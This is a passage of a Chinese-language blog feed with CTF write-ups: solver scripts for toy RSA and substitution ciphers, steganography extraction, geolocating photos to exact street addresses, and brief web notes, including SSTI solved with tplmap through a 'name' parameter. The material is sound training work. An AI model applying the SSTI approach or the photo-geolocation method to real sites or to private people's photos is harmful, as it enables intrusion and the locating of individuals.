class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;☳&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;☰&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;空&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br>        <span class="hljs-string">&#x27;☴&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;☱&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;☶&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;☲&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>&#125;<br>c= <span class="hljs-string">&#x27;☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲&#x27;</span><br>flag1=<span class="hljs-string">&#x27;&#x27;</span><br>flag2= <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#表1</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> x==<span class="hljs-string">&#x27; &#x27;</span>:<br>        flag1 +=<span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">continue</span><br>    flag1 +=  dict1.get(x)<br><span class="hljs-comment">#表2</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> x==<span class="hljs-string">&#x27; &#x27;</span>:<br>        flag2 +=<span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">continue</span><br>    flag2+=  dict2.get(x)<br><span class="hljs-built_in">print</span>(flag1)<br><span class="hljs-built_in">print</span>(flag2)<br><span class="hljs-comment">#80 102 74 102 76 74 146 74 125 126 132 122 137 122 115 124 53 137 137 134 148</span><br><span class="hljs-comment">#80 102 74 102 76 74 146 74 123 126 152 122 157 122 113 124 35 157 157 154 148</span><br></code></pre></td></tr></table></figure><p>然后在线转换器转一下发现表1是对的<br><code>HSCSEC&#123;Chinese_g0ssip&#125;</code></p><h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h3 id="Happy-Lantern-Festival"><a href="#Happy-Lantern-Festival" class="headerlink" title="Happy Lantern Festival"></a>Happy Lantern Festival</h3><p>说明：<code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天河市天河路天河步行街&#125;</code><br><img src="/mdimg/hscsec/2.png"><br>图片信息：<code>阿勒泰市第13届元宵灯会</code><br><img src="/mdimg/hscsec/3.png"><br><img src="/mdimg/hscsec/4.png"><br><code>HSCSEC&#123;新疆维吾尔自治区阿勒泰地区阿勒泰市五百里风情街&#125;</code></p><h3 id="Boat"><a href="#Boat" class="headerlink" title="Boat"></a>Boat</h3><p>说明：<code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;具体地址&#125;</code><br><img src="/mdimg/hscsec/5.png"><br>百度识图第一张就是<br><img src="/mdimg/hscsec/6.png"><br>地图搜西湖<br><img src="/mdimg/hscsec/7.png"><br><code>HSCSEC&#123;浙江省杭州市西湖区龙井路1号&#125;</code></p><h3 id="Cable-car"><a href="#Cable-car" class="headerlink" title="Cable car"></a>Cable car</h3><p><img src="/mdimg/hscsec/8.png"><br>一眼重庆<br><img src="/mdimg/hscsec/9.png"><br><img src="/mdimg/hscsec/10.png"><br>根据图片基本可以判断一个区域<br><img src="/mdimg/hscsec/11.png"><br>看图片是一个靠近江边的地方<br>搜山什集找到类似的图片<br><img src="/mdimg/hscsec/12.png"><br><code>HSCSEC&#123;重庆市渝中区白象居4号楼9-1号&#125;</code></p><h3 id="Romantic-firework"><a href="#Romantic-firework" class="headerlink" title="Romantic firework"></a>Romantic firework</h3><p><img src="/mdimg/hscsec/13.png"><br><img src="/mdimg/hscsec/14.png"><br>甘肃消防<br><img src="/mdimg/hscsec/15.png"><br>图上建筑吻合<br><a href="https://cul.sohu.com/a/635448600_120801">https://cul.sohu.com/a/635448600_120801</a><img src="/mdimg/hscsec/16.png"><br>地图上找位置<br><code>HSCSEC&#123;甘肃省白银市白银区金岭公园&#125;</code></p><h3 id="Airplane"><a href="#Airplane" class="headerlink" title="Airplane"></a>Airplane</h3><p><img src="/mdimg/hscsec/17.png"><br>一直分析飞机无果<br>重庆航空，飞机注册号B-30EL<br><img src="/mdimg/hscsec/18.png"><br>然查找B-30EL发现：<a href="https://www.jiemian.com/article/5391407.html">https://www.jiemian.com/article/5391407.html</a><br><img src="/mdimg/hscsec/19.png"><br><img src="/mdimg/hscsec/20.png"><br>大兴机场的鸟瞰图<br>对比吻合<br> <code>HSCSEC&#123; 北京市大兴区大兴国际机场&#125;</code></p><h3 id="Beautiful-Lake"><a href="#Beautiful-Lake" class="headerlink" title="Beautiful Lake"></a>Beautiful Lake</h3><p><code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天湖&#125;</code><br>看图片左侧<br><img src="/mdimg/hscsec/21.png"><br>宁夏理工学院<br><img src="/mdimg/hscsec/22.png"><br><img src="/mdimg/hscsec/23.png"><br><code>HSCSEC&#123;宁夏回族自治区石嘴山市大武口区星海湖&#125;</code></p><h3 id="Beautiful-Park"><a href="#Beautiful-Park" class="headerlink" title="Beautiful Park"></a>Beautiful Park</h3><p><code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天河国家湿地公园&#125;</code><br><img src="/mdimg/hscsec/24.png"><br><img src="/mdimg/hscsec/25.png"><br>地图搜<br><code>HSCSEC&#123;**河北省张家口市怀来县官厅水库国家湿地公园&#125;**</code></p><h3 id="Apple-Store"><a href="#Apple-Store" class="headerlink" title="Apple Store"></a>Apple Store</h3><p><code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天河路1号&#125; 例如：HSCSEC&#123;广东省广州市天河区天河路1号环贸F1&#125;</code><br><img src="/mdimg/hscsec/26.png"><br>百度地图：苹果西单大悦城店<br><img src="/mdimg/hscsec/27.png"><br><code>HSCSEC&#123;北京市西城区西单北大街131号&#125;</code></p><h3 id="Tower"><a href="#Tower" class="headerlink" title="Tower"></a>Tower</h3><p>澳门巴黎铁塔附近<br>全景地图<br><img src="/mdimg/hscsec/28.png"><br>看图片应该是在楼梯这个位置拍的<br><code> HSCSEC&#123;澳门特别行政区路氹填海区澳门路氹金光大道连贯公路澳门巴黎人&#125;</code></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h3 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python3</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><br>FLAG = <span class="hljs-string">&quot;*******************MASK****************&quot;</span><br><br><span class="hljs-comment"># print(FLAG)</span><br>number1 = getPrime(<span class="hljs-number">512</span>)<br>number2 = getPrime(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(number1)<br>result = FLAG * number1 % number2<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Output:</span><br><span class="hljs-string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span><br><span class="hljs-string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>显然number2远远大于number1，且flag就30位左右，所以<code>FLAG * number1 mod number2</code> 其实就等于<code>FLAG * number1</code><br>直接<code>FLAG =result// number1</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>number1=<span class="hljs-number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span><br>result=<span class="hljs-number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span><br>flag=result//number1<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;HSCSEC&#x27;</span>+<span class="hljs-built_in">str</span>(long_to_bytes(flag))[<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#HSCSEC&#123;qMmZqWvmj70bBsCfmVLT&#125;</span><br></code></pre></td></tr></table></figure><h3 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> m<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>,n)<br>e = <span class="hljs-number">0x10001</span><br>M = m * e * <span class="hljs-number">1</span> * <span class="hljs-number">2022</span> * p<br>c = <span class="hljs-built_in">pow</span>(M,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>,c)<br><br><span class="hljs-comment"># n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span><br><span class="hljs-comment"># c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">M = m * e * <span class="hljs-number">1</span> * <span class="hljs-number">2022</span> * p<br>c = <span class="hljs-built_in">pow</span>(M,e,n)<br></code></pre></td></tr></table></figure><p>这里猜测可以公约数求p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span><br>c = <span class="hljs-number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span><br>e = <span class="hljs-number">0x10001</span><br>x=(c*gmpy2.invert(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2022</span>,e,n),n)*gmpy2.invert(<span class="hljs-built_in">pow</span>(e,e,n),n))%n<br><span class="hljs-comment">#通过乘逆元然后求p，然后解RSA解出M</span><br>p=gmpy2.gcd(x,n)<br>q=n//p<br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>M=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-comment">#然后接着还原flag</span><br>m=M//e//<span class="hljs-number">2022</span>//p<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;HSCSEC&#x27;</span>+<span class="hljs-built_in">str</span>(long_to_bytes(m))[<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#HSCSEC&#123;3e5e2789a93a80615cc35edbff397c05&#125;</span><br></code></pre></td></tr></table></figure><h3 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> flag<br>alphabet = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span><br>key = <span class="hljs-string">&#x27;HSC&#x27;</span><br><span class="hljs-keyword">assert</span> flag.startswith(<span class="hljs-string">&#x27;HSCSEC&#123;&#x27;</span>)<br>flag_num_list = []<br>c = []<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> flag:<br>    flag_num_list.append(alphabet.find(item) + <span class="hljs-number">1</span>)<br>key_num = alphabet.find(key) + <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_num_list:<br>    m = (i + key_num) % <span class="hljs-number">94</span> - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> m == <span class="hljs-number">0</span>:<br>        c.append(<span class="hljs-string">&quot;□&quot;</span>)<br>    c.append(alphabet[m-<span class="hljs-number">1</span>:m])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(c)))<br><br><span class="hljs-comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span><br></code></pre></td></tr></table></figure><p>逆推一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">alphabet = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span><br>key = <span class="hljs-string">&#x27;HSC&#x27;</span><br>c = <span class="hljs-string">&quot;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>key_num = alphabet.find(key) + <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;□&quot;</span>:<br>        m = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        m = alphabet.find(i) + <span class="hljs-number">1</span><br>    flag_num = (m - key_num) % <span class="hljs-number">94</span> + <span class="hljs-number">1</span><br>    flag += alphabet[flag_num-<span class="hljs-number">1</span>:flag_num]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br><span class="hljs-comment">#flag = HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125;</span><br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="EZIMG"><a href="#EZIMG" class="headerlink" title="EZIMG"></a>EZIMG</h3><p><img src="/mdimg/hscsec/29.png"><br>010打开发现末尾有反过来的png<br>工具： <a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a><br>逆序一下<code>python3 FileReverse-Tools.py -i desktop.png</code><br><img src="/mdimg/hscsec/30.png"><br><code>HSCSEC&#123;p3g_h</code><br><img src="/mdimg/hscsec/31.png"><br>在文件尾后发现01数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>MAX = <span class="hljs-number">25</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;0000000001001011000000000000000000011111100000000000000000111010110000000000000000001110000000000000000000000010001100000000000000000010001011000000000000000010101010100000000000000001110110100000000011101111101110001110001001100010100110110100001011111010100100110001000111100100000100101001011000101100111100001101011110010010101001001001111100001110100110110100100011110110110110100001001101101011101001111010100011111101100000000101010011000110110000000010001101101010011000000001111111010001101100000000101100101111110010000000001000011010001100000000001010001111011000100000000111000111100000100000000011101101101010011&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>转换为二维码<br><img src="/mdimg/hscsec/32.png"><br>加定点<br><img src="/mdimg/hscsec/33.png"><br><img src="/mdimg/hscsec/34.png"><br><code>flag2:aQR_c0de_and   </code><br><a href="https://www.wotianna.com/pixels/">https://www.wotianna.com/pixels/</a><br><img src="/mdimg/hscsec/35.png"><br><code>_3nc&#125; </code><br>综上所述：<code>HSCSEC&#123;p3G_haQR_c0de_and_3nc&#125;</code></p><h3 id="Salute"><a href="#Salute" class="headerlink" title="Salute"></a>Salute</h3><p><img src="/mdimg/hscsec/36.png"><br>末尾有一段MD5<br><code>5d93ceb70e2bf5daa84ec3d0cd2c731a</code><br><img src="/mdimg/hscsec/37.png"><br><code>qwer1234</code><br>文件异或qwer1234<br><img src="/mdimg/hscsec/38.png"><br>得到压缩包<br><img src="/mdimg/hscsec/39.png"><br>对png<br><img src="/mdimg/hscsec/40.png"><br><code>flag2/key that_is</code>意思是flag2和KEY都是that_is，那么前面解出来的那串应该就是flag1了<br>steghide分离<br><code>steghide extract -sf /home/kali/桌面/salute.jpg -p that_is</code><br><img src="/mdimg/hscsec/41.png"><br><img src="/mdimg/hscsec/42.png"><br><code>flag3:_c0ol&#125;</code><br>综上所述：<code>HSCSEC&#123;qwer1234that_is_c0ol&#125;</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h3><p>tplmap 一把梭<br>注入点是name<br><img src="/mdimg/hscsec/43.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Byte Bandits CTF 2023</title>
    <link href="/2023/02/10/Byte%20Bandits%20CTF%202023/"/>
    <url>/2023/02/10/Byte%20Bandits%20CTF%202023/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="Improper-Error-Handling"><a href="#Improper-Error-Handling" class="headerlink" title="Improper Error Handling"></a>Improper Error Handling</h3><p><img src="/mdimg/bbctf/1.png"><br>打开靶机是这样的<br><img src="/mdimg/bbctf/2.png"><br>先看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;Top Secret Project&lt;/title&gt;<br>    &lt;style&gt;<br>      body &#123;<br>        font-family: Arial, sans-serif;<br>        margin: <span class="hljs-number">40</span>px;<br>      &#125;<br>      form &#123;<br>        display: flex;<br>        flex-direction: column;<br>        align-items: center;<br>      &#125;<br>      label &#123;<br>        font-size: <span class="hljs-number">1.2</span>em;<br>        margin-bottom: <span class="hljs-number">10</span>px;<br>      &#125;<br>      input[type=<span class="hljs-string">&quot;password&quot;</span>] &#123;<br>        font-size: <span class="hljs-number">1.2</span>em;<br>        padding: <span class="hljs-number">5</span>px;<br>        width: <span class="hljs-number">400</span>px;<br>        margin-bottom: <span class="hljs-number">20</span>px;<br>      &#125;<br>      button &#123;<br>        font-size: <span class="hljs-number">1.2</span>em;<br>        padding: <span class="hljs-number">5</span>px <span class="hljs-number">10</span>px;<br>        background-color: #<span class="hljs-number">4</span>CAF50;<br>        color: white;<br>        border-radius: <span class="hljs-number">5</span>px;<br>        cursor: pointer;<br>      &#125;<br>      pre &#123;<br>        background-color: <span class="hljs-meta">#eee;</span><br>        padding: <span class="hljs-number">20</span>px;<br>        white-space: pre-wrap;<br>        margin-top: <span class="hljs-number">20</span>px;<br>        display: none;<br>      &#125;<br>      .error &#123;<br>        color: red;<br>      &#125;<br>    &lt;/style&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;Top Secret Project&lt;/h1&gt;<br>    &lt;form&gt;<br>      &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;Enter the password:&lt;/label&gt;<br>      &lt;input type=<span class="hljs-string">&quot;password&quot;</span> id=<span class="hljs-string">&quot;input&quot;</span>&gt;<br>      &lt;button type=<span class="hljs-string">&quot;button&quot;</span> onclick=<span class="hljs-string">&quot;sendRequest()&quot;</span>&gt;Submit&lt;/button&gt;<br>    &lt;/form&gt;<br>    &lt;p class=<span class="hljs-string">&quot;error&quot;</span> id=<span class="hljs-string">&quot;error-message&quot;</span>&gt;&lt;/p&gt;<br>    &lt;pre id=<span class="hljs-string">&quot;debug-message&quot;</span>&gt;&lt;/pre&gt;<br>  &lt;/body&gt;<br>  &lt;script&gt;<br>    function sendRequest() &#123;<br>      let length = document.getElementById(<span class="hljs-string">&quot;input&quot;</span>).value;<br>      fetch(<span class="hljs-string">&quot;/api/error?length=&quot;</span> + length)<br>        .then(response =&gt; response.text())<br>        .then(text =&gt; &#123;<br>          <span class="hljs-keyword">if</span> (text.startsWith(<span class="hljs-string">&quot;Error&quot;</span>)) &#123;<br>            document.getElementById(<span class="hljs-string">&quot;error-message&quot;</span>).textContent = text;<br>            document.getElementById(<span class="hljs-string">&quot;error-message&quot;</span>).style.display = <span class="hljs-string">&quot;block&quot;</span>;<br>            document.getElementById(<span class="hljs-string">&quot;debug-message&quot;</span>).style.display = <span class="hljs-string">&quot;none&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>            document.getElementById(<span class="hljs-string">&quot;debug-message&quot;</span>).textContent = text;<br>            document.getElementById(<span class="hljs-string">&quot;debug-message&quot;</span>).style.display = <span class="hljs-string">&quot;block&quot;</span>;<br>            document.getElementById(<span class="hljs-string">&quot;error-message&quot;</span>).style.display = <span class="hljs-string">&quot;none&quot;</span>;<br>          &#125;<br>        &#125;);<br>    &#125;<br>  &lt;/script&gt;<br>  <br>&lt;/html&gt; <br></code></pre></td></tr></table></figure><p>定义了一个sendRequest()请求函数<br>访问：<br><code>/api/error?length=</code><br><img src="/mdimg/bbctf/3.png"><br>试试传参<br><img src="/mdimg/bbctf/4.png"><br>一步一步加长看看<br>当传任意参数到32位时，爆出了flag<br><img src="/mdimg/bbctf/5.png"></p><h3 id="Hi-Score"><a href="#Hi-Score" class="headerlink" title="Hi-Score"></a>Hi-Score</h3><p><img src="/mdimg/bbctf/6.png"><br>一秒点一百下就能拿flag<br>这种题，大概率跟js有关<br>先看看js<br><img src="/mdimg/bbctf/7.png"><br>调试器打开，找到一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">function _0x59a2() &#123;<br>var _0x78411b = [<br><span 